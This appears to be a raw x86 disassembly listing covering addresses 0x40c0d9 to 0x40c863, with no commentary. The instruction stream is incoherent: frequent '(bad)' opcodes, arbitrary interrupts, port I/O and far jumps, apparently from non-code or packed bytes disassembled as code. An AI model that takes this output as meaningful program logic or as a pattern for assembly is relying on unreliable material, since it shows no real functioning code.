  40c0d9:	mov    ah,0x5a
  40c0db:	rcr    al,1
  40c0dd:	xor    eax,0x475fff
  40c0e2:	(bad)  
  40c0e3:	(bad)  
  40c0e4:	lods   eax,DWORD PTR ds:[esi]
  40c0e5:	add    cl,al
  40c0e7:	pop    ebx
  40c0e8:	add    BYTE PTR [edx-0x4e],cl
  40c0eb:	add    ch,bl
  40c0ed:	fadd   QWORD PTR ds:0xf2143426
  40c0f3:	int3   
  40c0f4:	mov    esp,0x9d6cd46d
  40c0f9:	adc    al,al
  40c0fb:	ins    BYTE PTR es:[edi],dx
  40c0fc:	xchg   DWORD PTR [eax-0x414c5001],edi
  40c102:	push   0x18
  40c104:	pop    esi
  40c105:	int    0x9b
  40c107:	or     al,0xe0
  40c109:	inc    eax
  40c10a:	arpl   WORD PTR [eax],ax
  40c10c:	int    0x39
  40c10e:	jge    0x40c10f
  40c110:	push   0x10ff32eb
  40c115:	jle    0x40c117
  40c117:	out    0xe9,al
  40c119:	add    BYTE PTR [edi],dl
  40c11b:	jp     0x40c0a3
  40c11d:	outs   dx,BYTE PTR ds:[esi]
  40c11e:	cs leave 
  40c120:	sub    DWORD PTR [ecx+0x65],ebx
  40c123:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c125:	(bad)  
  40c126:	fisttp WORD PTR [esi+0x0]
  40c129:	shl    BYTE PTR [ebp+0x684087e5],1
  40c12f:	jo     0x40c19d
  40c131:	test   BYTE PTR [eax],0x83
  40c134:	in     eax,dx
  40c135:	jbe    0x40c159
  40c137:	mov    ah,BYTE PTR [esi+0x5225bc54]
  40c13d:	adc    eax,0xb65a2868
  40c142:	aam    0x97
  40c144:	enter  0xb4fa,0xa8
  40c148:	mov    ds:0x402cffc1,al
  40c14d:	push   0xffffffa9
  40c14f:	je     0x40c195
  40c151:	sub    eax,0xbf5dcfcd
  40c156:	repnz adc edi,DWORD PTR [ebx-0x2]
  40c15a:	xchg   esi,eax
  40c15b:	add    BYTE PTR [esi+0x20],cl
  40c15e:	add    BYTE PTR [edx],ah
  40c160:	push   ebx
  40c161:	xchg   BYTE PTR [ebp-0x6886d007],ch
  40c167:	add    dl,dh
  40c169:	jb     0x40c16b
  40c16b:	jne    0x40c1e1
  40c16d:	and    ah,BYTE PTR [eax+eax*8+0x68]
  40c171:	push   0x54058878
  40c176:	sub    eax,0x3249fea3
  40c17b:	or     BYTE PTR [eax+eiz*4-0x71590f17],bh
  40c182:	call   0xee418f9d
  40c187:	(bad)  
  40c188:	out    dx,al
  40c189:	int    0xf3
  40c18b:	mov    ds:0xdb6cb056,al
  40c190:	mov    ds:0x46ee4848,al
  40c195:	(bad)  
  40c196:	adc    DWORD PTR [eax],eax
  40c198:	sub    ecx,DWORD PTR [edi+0x60]
  40c19b:	fwait
  40c19c:	scas   al,BYTE PTR es:[edi]
  40c19d:	jae    0x40c17d
  40c19f:	add    BYTE PTR [ebp+0x68558480],al
  40c1a5:	sub    BYTE PTR [ebp+0x5],dl
  40c1a8:	dec    edi
  40c1a9:	pop    eax
  40c1aa:	shr    BYTE PTR [ebx-0x32],0xfe
  40c1ae:	mov    eax,ds:0xedd86efc
  40c1b3:	push   esi
  40c1b4:	xor    al,0xb
  40c1b6:	mov    ah,0xa7
  40c1b8:	jo     0x40c170
  40c1ba:	call   FWORD PTR [edx+0x2933b225]
  40c1c0:	out    0x45,al
  40c1c2:	aas    
  40c1c3:	shr    DWORD PTR [eax+edx*1-0x1b3dd02],1
  40c1ca:	iret   
  40c1cb:	add    BYTE PTR [ebp-0x6d],bh
  40c1ce:	stos   BYTE PTR es:[edi],al
  40c1cf:	add    BYTE PTR [ebp-0x19],cl
  40c1d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c1d3:	add    BYTE PTR [edx],ch
  40c1d5:	push   edx
  40c1d6:	cs jl  0x40c1c8
  40c1d9:	pop    esp
  40c1da:	mov    ebx,0x4854b10e
  40c1df:	adc    dh,bh
  40c1e1:	ss push eax
  40c1e3:	aas    
  40c1e4:	mov    fs,eax
  40c1e6:	ss cdq 
  40c1e8:	add    bh,BYTE PTR [ebx+0x364ac6ce]
  40c1ee:	push   ss
  40c1ef:	sub    BYTE PTR [eax],bh
  40c1f1:	pop    ebp
  40c1f2:	and    WORD PTR [ebx-0x7b570069],0xff80
  40c1fa:	dec    ecx
  40c1fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c1fc:	pop    edx
  40c1fd:	shr    DWORD PTR [edi-0x4c],0xa5
  40c201:	and    dh,BYTE PTR [ebp+0x684a9fa]
  40c207:	jp     0x40c213
  40c209:	call   0xc2f0f152
  40c20e:	or     BYTE PTR [edx],0xb9
  40c211:	sbb    edi,esi
  40c213:	sub    ah,al
  40c215:	into   
  40c216:	aam    0xc
  40c218:	mov    ecx,DWORD PTR [edx+0x4efe9dc8]
  40c21e:	add    BYTE PTR [eax-0x7d7518e4],0x26
  40c225:	pop    ebx
  40c226:	mov    al,0x1e
  40c228:	mov    eax,ds:0xdeecbe0a
  40c22d:	repz dec esp
  40c22f:	push   esp
  40c230:	pop    eax
  40c231:	rol    DWORD PTR [esi-0x112fdff3],cl
  40c237:	mov    dl,0xca
  40c239:	(bad)  
  40c23a:	sub    BYTE PTR [ebp+0x1476d440],al
  40c240:	cmp    al,0x3
  40c242:	mov    ds:0xd6dcf177,al
  40c247:	bound  edx,QWORD PTR [edx-0x3354524b]
  40c24d:	sti    
  40c24e:	dec    BYTE PTR [edx]
  40c250:	mov    dl,0xc6
  40c252:	div    BYTE PTR [esi-0x11]
  40c255:	push   edx
  40c256:	ins    DWORD PTR es:[edi],dx
  40c257:	or     eax,0x4cfee16d
  40c25c:	jl     0x40c2cd
  40c25e:	mov    al,0x5b
  40c260:	cs and edi,0x9378ec53
  40c267:	sub    dh,0x65
  40c26a:	mov    ah,0x0
  40c26c:	and    esp,DWORD PTR [edx+0x10bed596]
  40c272:	inc    ebp
  40c273:	push   edi
  40c274:	push   ecx
  40c275:	inc    ebx
  40c276:	mov    dh,0x2
  40c278:	xor    esp,DWORD PTR [esi]
  40c27a:	pop    ecx
  40c27b:	adc    al,0xd7
  40c27d:	jl     0x40c2f4
  40c27f:	push   esi
  40c280:	inc    ebx
  40c281:	push   ebp
  40c282:	mov    WORD PTR [esi-0xec2b3d],ss
  40c288:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c289:	sub    BYTE PTR [eax+0x6782a8ad],dh
  40c28f:	enter  0xd0a1,0x8a
  40c293:	pop    ss
  40c294:	cs (bad) 
  40c297:	or     al,0x6b
  40c299:	mov    al,0x21
  40c29b:	rol    BYTE PTR [eax+0x66a2a65f],0x5b
  40c2a2:	test   DWORD PTR [edi+edx*4+0x2e783946],eax
  40c2a9:	push   ss
  40c2aa:	dec    eax
  40c2ab:	ficom  DWORD PTR ds:0xb3fe6d57
  40c2b1:	add    DWORD PTR [eax],0x5300f03b
  40c2b7:	pop    esi
  40c2b8:	push   0xfffffffc
  40c2ba:	adc    al,BYTE PTR [eax]
  40c2bc:	push   esi
  40c2bd:	cli    
  40c2be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c2bf:	or     eax,0x500d058e
  40c2c4:	adc    ch,BYTE PTR fs:[edx]
  40c2c7:	or     dh,BYTE PTR [edx+0x38]
  40c2ca:	leave  
  40c2cb:	adc    BYTE PTR [ebp+0x68],ch
  40c2ce:	push   0x5d08e3b2
  40c2d3:	push   esi
  40c2d4:	mov    ebp,0x6dac8c06
  40c2d9:	jo     0x40c2c7
  40c2db:	nop
  40c2dc:	adc    eax,0x9b800c86
  40c2e1:	inc    esi
  40c2e2:	fisub  WORD PTR cs:[eax-0x7495950c]
  40c2e9:	es mov edx,0x2ea08203
  40c2ef:	cmp    edi,edi
  40c2f1:	xchg   edx,eax
  40c2f2:	inc    ebp
  40c2f3:	sbb    eax,0xe944368d
  40c2f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c2f9:	inc    DWORD PTR [edx]
  40c2fb:	and    al,0x89
  40c2fd:	sub    al,0x98
  40c2ff:	jmp    0x40c2b1
  40c301:	adc    eax,0xc471d81d
  40c306:	mov    al,0xc0
  40c308:	xor    al,0x6
  40c30a:	add    DWORD PTR [esp+edx*8-0x7a],ecx
  40c30e:	inc    ebx
  40c30f:	jl     0x40c2c0
  40c311:	daa    
  40c312:	add    BYTE PTR [eax+0x28],ch
  40c315:	(bad)  
  40c316:	push   ss
  40c317:	xor    dl,BYTE PTR [ecx+0x5ec751c0]
  40c31d:	cli    
  40c31e:	les    edx,FWORD PTR [ebp-0x6f61a001]
  40c324:	hlt    
  40c325:	in     al,dx
  40c326:	or     al,0x72
  40c328:	ret    
  40c329:	cs push cs
  40c32b:	fst    DWORD PTR [ebp+0x2b006efe]
  40c331:	xlat   BYTE PTR ds:[ebx]
  40c332:	push   esp
  40c333:	push   ss
  40c334:	xor    eax,0x327a2a14
  40c339:	jo     0x40c339
  40c33b:	xor    esi,esi
  40c33d:	mov    cl,0xa3
  40c33f:	xchg   edi,eax
  40c340:	cmp    dl,BYTE PTR [esi-0x42]
  40c343:	dec    esp
  40c344:	xor    eax,0xc7fff66c
  40c349:	mov    al,0x75
  40c34b:	cmp    DWORD PTR [eax+0x74ff8690],ebp
  40c351:	mov    bl,0xe8
  40c353:	mov    dh,0x76
  40c355:	xchg   edi,eax
  40c356:	call   0xaca0:0x8ff9d4c
  40c35d:	sar    edi,cl
  40c35f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c360:	daa    
  40c361:	push   esp
  40c362:	mov    esi,0x2000ed41
  40c367:	sbb    BYTE PTR [esi+0x2d1b6b5c],al
  40c36d:	sub    dl,ch
  40c36f:	call   edx
  40c371:	in     al,dx
  40c372:	test   eax,0xffd02872
  40c377:	outs   dx,BYTE PTR ds:[esi]
  40c378:	data16 mov al,ds:0x2c48e9b6
  40c37e:	lea    eax,[esi+eax*1]
  40c381:	rcl    DWORD PTR [eax],0xd4
  40c384:	push   ecx
  40c385:	sbb    BYTE PTR [ecx-0x10],0xfe
  40c389:	jp     0x40c31b
  40c38b:	inc    ebx
  40c38c:	inc    esi
  40c38d:	cmp    al,0x68
  40c38f:	inc    ecx
  40c390:	xchg   ebx,eax
  40c391:	fimul  WORD PTR [esi-0x3a18630a]
  40c397:	(bad)  
  40c398:	jl     0x40c3af
  40c39a:	lods   eax,DWORD PTR ds:[esi]
  40c39b:	push   ebp
  40c39c:	adc    al,0xe4
  40c39e:	cmp    ebp,DWORD PTR [eax]
  40c3a0:	add    eax,0xdcee6c52
  40c3a5:	push   edx
  40c3a6:	out    0x84,al
  40c3a8:	lods   eax,DWORD PTR ds:[esi]
  40c3a9:	mov    ds:0x1b00f9e3,al
  40c3ae:	jb     0x40c38f
  40c3b0:	cmp    ah,ch
  40c3b2:	sub    al,0xb8
  40c3b5:	mov    edx,0xfef0df04
  40c3ba:	sahf   
  40c3bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c3bc:	mov    ds,WORD PTR [edx]
  40c3be:	add    dh,dl
  40c3c0:	shr    DWORD PTR [edx+ecx*2+0x4d],1
  40c3c4:	test   al,0xe1
  40c3c6:	dec    ecx
  40c3c7:	fwait
  40c3c8:	call   0x585d1c64
  40c3cd:	bound  esp,QWORD PTR [ecx-0x4ec00660]
  40c3d3:	dec    BYTE PTR [edx+0x4e]
  40c3d6:	(bad)  
  40c3d7:	xor    al,0x81
  40c3d9:	add    ah,cl
  40c3db:	enter  0x3800,0xe2
  40c3df:	pop    ebp
  40c3e0:	mov    ecx,DWORD PTR [ebp*4-0x2529c594]
  40c3e7:	and    dh,ah
  40c3e9:	adc    DWORD PTR [esi-0x2],edi
  40c3ec:	cli    
  40c3ed:	or     eax,0xf9ec0b
  40c3f2:	mov    dl,0xfd
  40c3f4:	add    bh,dh
  40c3f6:	mov    edi,DWORD PTR [edx]
  40c3f8:	or     al,0xd
  40c3fa:	sti    
  40c3fb:	dec    edx
  40c3fc:	push   ds
  40c3fd:	sub    al,0x5d
  40c3ff:	mov    eax,DWORD PTR [esp+edx*1+0x62]
  40c403:	test   eax,0x6c54fe63
  40c408:	xchg   ebx,eax
  40c409:	and    DWORD PTR [esi-0x12],edx
  40c40c:	es fdivp st(7),st
  40c40f:	les    esp,FWORD PTR ds:0xad00100c
  40c415:	cmc    
  40c416:	fidiv  DWORD PTR [eax+0x19]
  40c419:	push   edi
  40c41a:	adc    DWORD PTR [edi],0x9422933a
  40c420:	push   0x6aa27068
  40c425:	jb     0x40c425
  40c427:	mov    al,0xc8
  40c429:	inc    esp
  40c42a:	or     DWORD PTR [ebp*4+0x41faa86d],ebx
  40c431:	bound  ebx,QWORD PTR ds:0x88411644
  40c437:	mov    edi,0x589f456c
  40c43c:	rcr    BYTE PTR [edx+edi*1],1
  40c43f:	pushf  
  40c440:	cmova  edi,esi
  40c443:	xor    ebx,edx
  40c445:	cmc    
  40c446:	rcl    DWORD PTR [edx-0x5e],1
  40c449:	sbb    eax,0x7a37fefc
  40c44e:	(bad)  
  40c44f:	mov    ebp,0x5a20db02
  40c454:	cmp    ch,BYTE PTR [esi]
  40c456:	push   esi
  40c457:	xor    cl,BYTE PTR [eax]
  40c459:	mov    al,0x2f
  40c45b:	(bad)  
  40c45c:	shl    dh,cl
  40c45e:	jg     0x40c430
  40c460:	mov    ch,dh
  40c462:	and    bl,BYTE PTR [ecx-0x23]
  40c465:	dec    BYTE PTR [ebp-0x1121ff6f]
  40c46b:	add    BYTE PTR [esp+ebp*2],ah
  40c46e:	add    eax,0xbffe5d8e
  40c473:	adc    al,0x30
  40c475:	xchg   esi,eax
  40c476:	mov    ebx,0x448e250a
  40c47b:	inc    ebx
  40c47c:	ret    
  40c47d:	xor    BYTE PTR [bx+di],ah
  40c480:	mov    ah,dh
  40c482:	lea    edi,[edx+0x7d]
  40c485:	lds    esi,FWORD PTR [ebx]
  40c487:	add    al,0x3c
  40c489:	(bad)  
  40c48a:	adc    ebp,eax
  40c48c:	dec    eax
  40c48d:	push   0x52
  40c48f:	pop    edx
  40c490:	inc    ebx
  40c491:	push   ecx
  40c492:	inc    ebp
  40c493:	xor    BYTE PTR [esi+eax*4],bl
  40c496:	aam    0x46
  40c498:	(bad)  
  40c499:	addr16 sub al,dh
  40c49c:	int    0xb0
  40c49e:	std    
  40c49f:	mov    ah,al
  40c4a1:	arpl   WORD PTR [eax+0x64],ax
  40c4a4:	add    BYTE PTR [edi-0x78],bh
  40c4a7:	jp     0x40c50e
  40c4a9:	mov    al,0x5e
  40c4ab:	and    bl,al
  40c4ad:	rcl    BYTE PTR [ebx],1
  40c4af:	xchg   BYTE PTR [ebp+0x4a],ch
  40c4b2:	jmp    FWORD PTR [eax-0x7d4f6a14]
  40c4b8:	push   esi
  40c4b9:	fldenv [eax]
  40c4bb:	push   esp
  40c4bc:	(bad)  
  40c4bd:	and    eax,0x42dcc921
  40c4c2:	push   ds
  40c4c3:	fcmovbe st,st(0)
  40c4c5:	or     DWORD PTR [ebx+0x5fff0c18],eax
  40c4cb:	ret    0x30c8
  40c4ce:	mov    cl,0x35
  40c4d0:	(bad)  [esi+ebx*4]
  40c4d3:	jo     0x40c533
  40c4d5:	inc    ecx
  40c4d6:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  40c4d8:	out    dx,eax
  40c4d9:	mov    al,ds:0xfaf426b
  40c4de:	loopne 0x40c521
  40c4e0:	retf   0xb5fe
  40c4e3:	into   
  40c4e4:	add    al,0xfe
  40c4e6:	inc    ebp
  40c4e7:	ins    DWORD PTR es:[edi],dx
  40c4e8:	imul   edi,esi,0x66b70033
  40c4ee:	add    BYTE PTR ds:0x2d820e3f,ah
  40c4f4:	ret    0xdbbb
  40c4f7:	loope  0x40c482
  40c4f9:	sbb    eax,0xff10ec6c
  40c4fe:	data16 sbb al,0x77
  40c501:	xchg   esp,eax
  40c502:	inc    ecx
  40c503:	xchg   ebp,eax
  40c504:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c505:	pop    edx
  40c506:	sub    eax,0x36ff90d0
  40c50b:	rcl    BYTE PTR [esi+0x456c1b34],cl
  40c511:	sub    eax,DWORD PTR [edx-0x1ddbc56]
  40c517:	test   DWORD PTR ds:0x58868336,ebx
  40c51d:	mov    ch,0xf0
  40c51f:	ret    0xe00d
  40c522:	dec    BYTE PTR [ebp+0x485abbcd]
  40c528:	mov    esi,0xbb34fe15
  40c52d:	add    ch,cl
  40c52f:	xor    BYTE PTR [edi-0x30],bh
  40c532:	ss xor al,0xe8
  40c535:	sbb    al,0xfe
  40c537:	mov    esi,0x3aa2873e
  40c53c:	cmc    
  40c53d:	push   esi
  40c53e:	xor    al,0x5d
  40c540:	(bad)  
  40c541:	mov    al,0x13
  40c543:	cmp    dh,0xfb
  40c546:	jl     0x40c506
  40c548:	sub    al,0x63
  40c54a:	ficom  DWORD PTR [eax-0x73]
  40c54d:	aaa    
  40c54e:	lods   al,BYTE PTR ds:[esi]
  40c54f:	(bad)  
  40c550:	cs push esi
  40c552:	out    dx,eax
  40c553:	fsub   DWORD PTR [edx+0x3466d855]
  40c559:	fsubr  QWORD PTR [ebp-0x5a]
  40c55c:	pop    eax
  40c55d:	inc    eax
  40c55e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c55f:	xchg   esp,eax
  40c560:	sahf   
  40c561:	movq   mm5,mm0
  40c564:	mov    ch,0xd6
  40c566:	shr    DWORD PTR ds:0x313e04ff,cl
  40c56c:	dec    ecx
  40c56d:	add    BYTE PTR [ebx-0x1],dh
  40c570:	pop    ss
  40c571:	mov    ah,0xb6
  40c573:	mov    ch,0xc
  40c575:	push   0xffffffc4
  40c577:	inc    eax
  40c578:	or     BYTE PTR [edi-0x42],0xd2
  40c57c:	jl     0x40c5fa
  40c57e:	pusha  
  40c57f:	imul   eax,DWORD PTR [eax],0xaef2bf8b
  40c585:	or     eax,0xfe3afde6
  40c58a:	and    eax,DWORD PTR [eax]
  40c58c:	int    0xcb
  40c58e:	mov    ds:0xbe3f00bb,eax
  40c593:	add    BYTE PTR [ebx-0x2b],bl
  40c596:	rcr    BYTE PTR [edx+0x620a3bbf],1
  40c59c:	dec    edx
  40c59d:	xchg   edi,eax
  40c59e:	fdivrp st(1),st
  40c5a0:	xor    eax,0xcbb4547c
  40c5a5:	cs (bad) 
  40c5a7:	je     0x40c5c5
  40c5a9:	xchg   edi,eax
  40c5aa:	mov    BYTE PTR [esi-0x4fd4b71e],ch
  40c5b0:	shl    DWORD PTR [edx+ebx*1],0xc4
  40c5b4:	mov    ebx,gs
  40c5b6:	outs   dx,DWORD PTR ds:[esi]
  40c5b7:	call   DWORD PTR [esi]
  40c5b9:	cmp    DWORD PTR [eax-0x78],esi
  40c5bc:	fadd   DWORD PTR [esp+edi*4-0x5a]
  40c5c0:	cmp    BYTE PTR [ebp-0x8],ch
  40c5c3:	popa   
  40c5c4:	and    DWORD PTR [ebp+0x3e70fe91],ebp
  40c5ca:	jle    0x40c581
  40c5cc:	dec    edx
  40c5cd:	xor    edx,edx
  40c5cf:	inc    DWORD PTR [esi-0x3]
  40c5d2:	or     BYTE PTR [esi+0x22],ah
  40c5d5:	push   0xffffffce
  40c5d7:	dec    edi
  40c5d8:	mov    ds:0xee20b2ad,eax
  40c5dd:	adc    DWORD PTR [esi+0x5877ff],0xffffffde
  40c5e4:	add    DWORD PTR [ebx],ebx
  40c5e6:	call   0xe64d:0x40e0fe1a
  40c5ed:	sahf   
  40c5ee:	bound  esp,QWORD PTR [ebx-0xa6e940]
  40c5f4:	sahf   
  40c5f5:	call   eax
  40c5f7:	lods   al,BYTE PTR ds:[esi]
  40c5f8:	test   al,0xad
  40c5fa:	add    eax,0xfe571545
  40c5ff:	mov    cl,0x0
  40c601:	push   cs
  40c602:	mov    esi,0x3c027a3f
  40c607:	dec    ebx
  40c608:	adc    BYTE PTR [edx-0x1445f06],al
  40c60e:	add    BYTE PTR [edx-0x3c5c57a8],0x26
  40c615:	and    al,0x16
  40c617:	lds    eax,FWORD PTR [ecx-0x1]
  40c61a:	sub    DWORD PTR [edx+eiz*4-0x4f43c2ab],eax
  40c621:	push   0xfec031fe
  40c626:	fs ss pop ecx
  40c629:	pusha  
  40c62a:	fwait
  40c62b:	push   ds
  40c62c:	mov    ah,0x82
  40c62e:	jle    0x40c646
  40c630:	(bad)  
  40c631:	sbb    BYTE PTR [edx],cl
  40c633:	daa    
  40c634:	mov    edx,fs
  40c636:	retf   0xac0b
  40c639:	push   ecx
  40c63a:	pushf  
  40c63b:	cmp    esi,edi
  40c63d:	(bad)  
  40c63e:	mov    bh,0xe4
  40c640:	jle    0x40c627
  40c642:	jae    0x40c636
  40c644:	popf   
  40c645:	add    BYTE PTR [eax],dl
  40c647:	push   0x8df663c2
  40c64c:	add    al,al
  40c64e:	cmp    BYTE PTR [eax],al
  40c650:	xchg   BYTE PTR ds:[esi],cl
  40c653:	push   0x4f
  40c655:	icebp  
  40c656:	icebp  
  40c657:	push   ss
  40c658:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c659:	jmp    DWORD PTR [esi-0x49da5c02]
  40c65f:	out    0x31,al
  40c661:	add    BYTE PTR [edi-0x32],cl
  40c664:	xchg   esp,eax
  40c665:	es stos DWORD PTR es:[edi],eax
  40c667:	pusha  
  40c668:	sbb    bl,BYTE PTR ds:[edx-0x39]
  40c66c:	adc    dh,bh
  40c66e:	dec    esi
  40c66f:	fisubr DWORD PTR [esi]
  40c671:	imul   ecx,DWORD PTR [esi],0xffffffa4
  40c674:	adc    dh,0x3a
  40c677:	rcl    DWORD PTR [eax],1
  40c679:	(bad)  
  40c67a:	dec    BYTE PTR [esp+ebp*4]
  40c67d:	lahf   
  40c67e:	cmp    cl,BYTE PTR [eax]
  40c680:	ins    DWORD PTR es:[edi],dx
  40c681:	jmp    0xf0e:0x9c1eb07a
  40c688:	hlt    
  40c689:	adc    DWORD PTR [edi-0x426fa62f],ebp
  40c68f:	inc    eax
  40c690:	push   edx
  40c691:	add    BYTE PTR [edx+0x12],dl
  40c694:	hlt    
  40c695:	push   0x5ae00e44
  40c69a:	je     0x40c6e7
  40c69c:	add    BYTE PTR [ebp-0x2],al
  40c69f:	xlat   BYTE PTR ds:[ebx]
  40c6a0:	pushf  
  40c6a1:	into   
  40c6a2:	inc    esi
  40c6a3:	mov    esi,0xcd0d6a3e
  40c6a8:	jl     0x40c720
  40c6aa:	jnp    0x40c714
  40c6ac:	clc    
  40c6ad:	loop   0x40c726
  40c6af:	push   DWORD PTR [ebx-0x4e]
  40c6b2:	xor    BYTE PTR [esi-0x2d1d3c5f],0x6f
  40c6b9:	ret    0x2ced
  40c6bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c6bd:	stos   BYTE PTR es:[edi],al
  40c6be:	xlat   BYTE PTR ds:[ebx]
  40c6bf:	out    0xcd,al
  40c6c1:	push   eax
  40c6c2:	inc    esi
  40c6c3:	sub    BYTE PTR [esi-0x12],ch
  40c6c6:	in     eax,0x24
  40c6c8:	add    BYTE PTR [ebx-0x1f],ah
  40c6cb:	and    bh,bh
  40c6cd:	sbb    bl,BYTE PTR [eax+esi*4+0x5b0adda2]
  40c6d4:	call   0x6f36:0xa3d57aff
  40c6db:	mov    bh,dh
  40c6dd:	push   ebx
  40c6de:	rcl    DWORD PTR [eax],1
  40c6e0:	add    BYTE PTR [edi-0x33],cl
  40c6e3:	or     al,0x3c
  40c6e5:	add    bl,BYTE PTR [ebp-0x45]
  40c6e8:	fcmove st,st(1)
  40c6ea:	out    dx,al
  40c6eb:	inc    edi
  40c6ec:	mov    ebp,es
  40c6ee:	add    al,0x3e
  40c6f0:	adc    BYTE PTR [ebp+0x61],0xde
  40c6f4:	aam    0xff
  40c6f6:	jle    0x40c686
  40c6f8:	cld    
  40c6f9:	add    BYTE PTR [ebx],bh
  40c6fb:	jp     0x40c71f
  40c6fd:	aaa    
  40c6fe:	adc    DWORD PTR [eax+0x55],ebx
  40c701:	aam    0xf2
  40c703:	mov    ch,0xe
  40c705:	xor    esp,esp
  40c707:	mov    cl,0xf0
  40c709:	bound  eax,QWORD PTR [ecx+0x8ffc046]
  40c70f:	push   0xfffffffe
  40c711:	jmp    0xff5ee22b
  40c716:	and    esp,esi
  40c718:	mov    eax,ds:0x5e8ee0
  40c71d:	popf   
  40c71e:	fdiv   QWORD PTR [ebp+edx*1+0x74]
  40c722:	and    BYTE PTR [edx],0xff
  40c725:	pop    ss
  40c726:	mov    edx,0xd113da95
  40c72b:	xchg   ecx,eax
  40c72c:	ss adc al,0x72
  40c72f:	xchg   ecx,eax
  40c730:	push   cs
  40c731:	cmovle edi,DWORD PTR [eax]
  40c734:	or     ebp,DWORD PTR [esi+0x15]
  40c737:	pop    ecx
  40c738:	pusha  
  40c739:	push   edi
  40c73a:	mov    DWORD PTR [esi],edi
  40c73c:	pop    es
  40c73d:	inc    esi
  40c73e:	(bad)  
  40c73f:	ds or  edx,0xff7e05bf
  40c746:	jge    0x40c747
  40c748:	jns    0x40c702
  40c74a:	add    bh,dh
  40c74c:	add    BYTE PTR ss:[ebp-0x4c],dh
  40c750:	add    BYTE PTR [ebp-0x72],cl
  40c753:	adc    eax,0x62eef8e
  40c758:	jo     0x40c745
  40c75a:	rcl    DWORD PTR [eax],cl
  40c75c:	or     edx,DWORD PTR [eax+edx*2]
  40c75f:	test   al,0xfe
  40c761:	(bad)  
  40c762:	mov    esi,0x6012282c
  40c767:	popa   
  40c768:	mov    al,ds:0xf05d2c1c
  40c76d:	fistp  DWORD PTR [edx]
  40c76f:	push   es
  40c770:	ror    DWORD PTR [edx],1
  40c772:	or     edi,edi
  40c774:	cmp    dl,BYTE PTR [ebp-0x6c]
  40c777:	ds sub al,0xe1
  40c77a:	sub    ebx,DWORD PTR [esi]
  40c77c:	adc    DWORD PTR [ecx-0x1],0xacb46
  40c783:	dec    ecx
  40c784:	mov    BYTE PTR [ebx-0x2b7cb895],dl
  40c78a:	sub    al,0x45
  40c78c:	pusha  
  40c78d:	ret    
  40c78e:	add    dl,BYTE PTR [eax-0x4e]
  40c791:	mov    esp,0xbf788405
  40c796:	inc    BYTE PTR [eax]
  40c798:	cmp    eax,0xf6b7fffe
  40c79d:	add    BYTE PTR ds:0xd05c35a1,dh
  40c7a3:	repnz neg BYTE PTR [ebx+0x0]
  40c7a7:	push   eax
  40c7a8:	xchg   BYTE PTR [eax+esi*2],ch
  40c7ab:	aam    0xc9
  40c7ad:	mov    ah,0xa9
  40c7af:	stos   DWORD PTR es:[edi],eax
  40c7b0:	into   
  40c7b1:	lods   al,BYTE PTR ds:[esi]
  40c7b2:	xchg   BYTE PTR [ebx-0x7d933aea],ch
  40c7b8:	stos   BYTE PTR es:[edi],al
  40c7b9:	jb     0x40c75c
  40c7bb:	mov    ds:0x23e085a0,eax
  40c7c0:	ss xchg esi,eax
  40c7c2:	jno    0x40c7c6
  40c7c4:	sub    ebp,DWORD PTR [edx-0x16]
  40c7c7:	adc    BYTE PTR [esi-0x4ed9abe4],0x70
  40c7ce:	ds push eax
  40c7d0:	ror    DWORD PTR [edx],1
  40c7d2:	adc    al,0x58
  40c7d4:	push   esp
  40c7d5:	cmp    BYTE PTR [esi+0x60aa6af8],cl
  40c7db:	pop    ebp
  40c7dc:	cmp    ecx,DWORD PTR [edx]
  40c7de:	inc    esi
  40c7df:	stc    
  40c7e0:	cmp    al,0x16
  40c7e2:	fbld   TBYTE PTR [ebx+esi*2+0x2a1b600a]
  40c7e9:	or     bh,BYTE PTR [edx]
  40c7eb:	hlt    
  40c7ec:	lods   al,BYTE PTR ds:[esi]
  40c7ed:	pop    esp
  40c7ee:	ficomp DWORD PTR [edx+0x3]
  40c7f1:	inc    esp
  40c7f2:	(bad)  
  40c7f4:	push   eax
  40c7f5:	push   eax
  40c7f6:	push   ds
  40c7f7:	int    0x2a
  40c7f9:	jb     0x40c78d
  40c7fb:	std    
  40c7fc:	retf   0x8772
  40c7ff:	cmp    cl,BYTE PTR ds:0xaa15ad55
  40c805:	retf   
  40c806:	xor    al,0x20
  40c808:	lods   al,BYTE PTR ds:[esi]
  40c809:	dec    edi
  40c80a:	adc    ah,al
  40c80c:	xchg   edx,eax
  40c80d:	jp     0x40c851
  40c80f:	or     cl,BYTE PTR [ebp+0x15]
  40c812:	push   ss
  40c813:	inc    esp
  40c814:	add    al,0xe3
  40c816:	fdivr  DWORD PTR ds:0xe6b58160
  40c81c:	retf   0x94d2
  40c81f:	sar    dl,cl
  40c821:	es pushf 
  40c823:	imul   edx
  40c825:	push   0xffffffa8
  40c827:	jp     0x40c7e5
  40c829:	xor    BYTE PTR [edx-0x137fe5da],cl
  40c82f:	and    DWORD PTR [eax-0x7f],edx
  40c832:	ins    DWORD PTR es:[edi],dx
  40c833:	jbe    0x40c807
  40c835:	dec    esp
  40c836:	inc    eax
  40c837:	xor    BYTE PTR [ecx],cl
  40c839:	rcl    bl,0xd1
  40c83c:	push   eax
  40c83d:	aam    0x24
  40c83f:	cmp    bl,BYTE PTR [edi+ebx*1-0x7a]
  40c843:	jbe    0x40c829
  40c845:	xchg   eax,edx
  40c847:	inc    esp
  40c848:	pop    ebx
  40c849:	inc    ebx
  40c84a:	mov    esp,0x32a6beb6
  40c84f:	cmp    DWORD PTR [eax+0x5b4364d6],eax
  40c855:	push   ecx
  40c856:	aam    0x32
  40c858:	push   esi
  40c859:	sbb    bh,BYTE PTR [esi]
  40c85b:	push   edx
  40c85c:	sbb    eax,0x865f2ec1
  40c861:	rcl    ecx,1
  40c863:	sub    BYTE PTR [ecx+0x6b],dl
